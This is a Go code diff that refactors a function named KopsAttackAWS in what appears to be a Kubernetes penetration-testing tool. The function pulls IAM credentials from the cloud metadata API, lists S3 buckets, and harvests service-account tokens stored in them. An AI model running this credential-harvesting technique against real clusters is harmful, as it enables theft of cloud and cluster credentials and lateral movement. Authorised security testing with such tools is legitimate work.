@@ -14,9 +14,9 @@ import (
 	"strings"
 
 	"github.com/aws/aws-sdk-go/aws"
-	"github.com/aws/aws-sdk-go/service/s3"
 	"github.com/aws/aws-sdk-go/aws/credentials"
 	"github.com/aws/aws-sdk-go/aws/session"
+	"github.com/aws/aws-sdk-go/service/s3"
 	"github.com/aws/aws-sdk-go/service/sts"
 )
 
@@ -295,17 +295,11 @@ func ListAWSBuckets(IAMCredentials AWSCredentials) (bucketNamesList []string, er
 
 func nonexitErrorf(msg string, args ...interface{}) {
 
-
-
 	fmt.Fprintf(os.Stderr, msg+"\n", args...)
 
 }
 
-
-
-
-func KopsAttackAWS() (serviceAccountsToReturn []ServiceAccount, err error ) {
-
+func KopsAttackAWS(serviceAccounts *[]ServiceAccount) (err error) {
 
 	var storeTokens string
 	placeTokensInStore := false
@@ -334,7 +328,7 @@ func KopsAttackAWS() (serviceAccountsToReturn []ServiceAccount, err error ) {
 		result, err := PullIamCredentialsFromAWS()
 		if err != nil {
 			println("[-] Could not get AWS credentials from metadata API.")
-			return nil, err
+			return err
 		}
 		println("[+] Got AWS credentials from metadata API.")
 		awsCredentials = result
@@ -346,7 +340,7 @@ func KopsAttackAWS() (serviceAccountsToReturn []ServiceAccount, err error ) {
 	result, err := ListAWSBuckets(credentialsToUse)
 	if err != nil {
 		println("Could not list buckets")
-		return nil, err
+		return err
 	}
 	listOfBuckets := result
 
@@ -362,7 +356,7 @@ func KopsAttackAWS() (serviceAccountsToReturn []ServiceAccount, err error ) {
 		resp, err := svc.ListObjectsV2(&s3.ListObjectsV2Input{Bucket: aws.String(bucket)})
 		if err != nil {
 			println("Unable to list items in bucket %q, %v", bucket, err)
-			return nil, err
+			return err
 		}
 
 		for _, item := range resp.Contents {
@@ -400,8 +394,7 @@ func KopsAttackAWS() (serviceAccountsToReturn []ServiceAccount, err error ) {
 					if placeTokensInStore {
 						tokenName := "AWS-acquired: " + string(*item.Key)
 						println("[+] Storing token as:", tokenName)
-						serviceAccount := MakeNewServiceAccount(tokenName, tokenString, "AWS Bucket")
-						serviceAccountsToReturn = append(serviceAccountsToReturn, serviceAccount)
+						AddNewServiceAccount(tokenName, tokenString, "AWS Bucket", serviceAccounts)
 					}
 				}
 
@@ -409,6 +402,6 @@ func KopsAttackAWS() (serviceAccountsToReturn []ServiceAccount, err error ) {
 
 		}
 	}
-	return serviceAccountsToReturn, nil
+	return nil
 
 }
